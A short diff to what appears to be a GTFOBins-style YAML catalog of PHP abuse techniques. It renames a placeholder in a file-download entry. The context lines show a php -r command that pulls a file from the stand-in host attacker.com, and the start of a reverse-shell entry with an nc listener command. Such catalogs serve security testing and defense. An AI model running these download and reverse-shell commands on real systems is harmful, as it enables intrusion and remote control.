@@ -38,7 +38,7 @@ functions:
     - description: Fetch a remote file via HTTP GET request.
       code: |
         export URL=http://attacker.com/file_to_get
-        export LFILE=where_to_save
+        export LFILE=file_to_save
         php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
   reverse-shell-interactive:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
